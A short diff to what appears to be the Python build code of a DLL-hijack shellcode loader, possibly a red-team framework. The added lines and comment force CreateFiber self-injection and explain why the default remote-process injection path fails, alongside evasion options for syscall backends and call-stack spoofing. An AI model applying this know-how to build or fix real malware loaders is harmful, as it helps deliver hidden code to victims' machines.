@@ -4780,6 +4780,15 @@ generated if none have been entered.""",
                     f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
                     f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                     "TARGET=dll",
+                    # Hijack DLL is already running inside the victim - force
+                    # CreateFiber self-injection. Without this the Makefile
+                    # default (INJECTION_TYPE=3 / EarlyCascade) wins via its
+                    # -DCONFIG_INJECTION_TYPE define, which short-circuits the
+                    # `#ifndef CONFIG_INJECTION_TYPE` guard in config.hpp and
+                    # routes the loader into the remote CreateProcessW path
+                    # with an empty CONFIG_TARGET_PROCESS - the suspended
+                    # process spawn then fails and no shellcode runs.
+                    "INJECTION_TYPE=2",
                     f"EREBUS_HASH_SEED={_hash_seed}",
                     f"CONFIG_SYSCALL_BACKEND={_sw3}",
                     f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
